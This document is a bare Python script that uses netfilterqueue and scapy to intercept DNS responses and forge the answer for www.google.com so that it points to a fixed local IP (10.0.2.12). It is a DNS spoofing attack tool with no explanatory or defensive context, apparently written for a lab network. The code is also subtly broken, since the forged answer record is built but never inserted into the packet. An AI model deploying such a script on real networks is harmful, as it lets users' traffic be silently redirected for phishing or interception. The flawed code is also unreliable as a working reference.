#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ip_server = "10.0.2.12"

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = str(scapy_packet[scapy.DNSQR].qname)
        if "www.google.com" in qname:
            answer = scapy.DNSRR(rrname=qname, rdata=ip_server)
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

